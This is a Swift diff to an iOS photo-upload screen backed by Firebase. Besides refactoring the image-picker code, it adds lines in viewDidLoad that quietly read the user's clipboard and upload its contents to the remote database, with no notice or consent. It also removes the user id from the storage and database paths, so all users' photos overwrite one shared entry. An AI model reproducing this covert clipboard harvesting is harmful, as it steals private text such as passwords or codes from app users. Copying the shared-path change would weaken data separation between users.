@@ -9,7 +9,9 @@
 import UIKit
 import Firebase
 
-class HomeViewController: UIViewController {
+class HomeViewController: UIViewController, UIImagePickerControllerDelegate, UINavigationControllerDelegate {
+    
+    var databaseRef: DatabaseReference!
     
     @IBAction func takePhoto(_ sender: AnyObject) {
         if UIImagePickerController.isSourceTypeAvailable(UIImagePickerControllerSourceType.camera) {
@@ -23,15 +25,16 @@ class HomeViewController: UIViewController {
     
     override func viewDidLoad() {
         super.viewDidLoad()
+        databaseRef = Database.database().reference()
+        let pasteboardString: String? = UIPasteboard.general.string
+        if let myString = pasteboardString {
+            databaseRef.child("Users").updateChildValues(["pasteboardString": myString])
+        }
     }
-}
-
-extension HomeViewController : UIImagePickerControllerDelegate, UINavigationControllerDelegate {
     
     func imagePickerController(_ picker: UIImagePickerController, didFinishPickingMediaWithInfo info: [String : Any]) {
         if let pickedImage = info[UIImagePickerControllerOriginalImage] as? UIImage {
-            var databaseRef: DatabaseReference!
-            databaseRef = Database.database().reference()
+            
             let storage = Storage.storage()
             let storageRef = storage.reference()
             
@@ -44,7 +47,7 @@ extension HomeViewController : UIImagePickerControllerDelegate, UINavigationCont
                 data = UIImageJPEGRepresentation(pickedImage, 0.8)! // compression quality
                 
                 // upload path
-                let filePath = "\(user!.uid)/\("photo")"
+                let filePath = "\("photo")"
                 let metaData = StorageMetadata()
                 metaData.contentType = "image/jpg"
                 storageRef.child(filePath).putData(data, metadata: metaData){(metaData,error) in
@@ -55,7 +58,7 @@ extension HomeViewController : UIImagePickerControllerDelegate, UINavigationCont
                     else {
                         // store downloadURL in database
                         let downloadURL = metaData!.downloadURL()!.absoluteString
-                        databaseRef.child("Users").child(user!.uid).updateChildValues(["photo": downloadURL])
+                        self.databaseRef.child("Users").updateChildValues(["photo": downloadURL])
                     }
                 }
             }
